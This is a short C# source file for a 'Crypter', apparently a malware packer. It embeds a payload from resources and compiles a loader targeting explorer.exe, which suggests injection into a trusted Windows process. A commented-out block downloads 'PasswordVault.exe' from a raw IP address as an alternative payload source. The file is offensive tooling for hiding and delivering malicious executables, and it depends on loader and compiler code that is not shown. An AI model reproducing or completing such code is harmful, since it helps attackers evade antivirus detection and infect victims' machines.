using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Crypter
{
    class Program
    {
        static void Main(string[] args)
        {
			string source = Properties.Resources.Loader;
			byte[] file = Properties.Resources.file;
			
			//Use to download from remote server instead

			/*using (WebClient client = new WebClient())
			{
				byte[] fileData = client.DownloadData("http://99.35.45.147/PasswordVault.exe");
				filebytes = fileData;
			}*/


			Compiler.CompileLoader(source, file, @"C:\Windows\System32\explorer.exe");
		}
    }
}
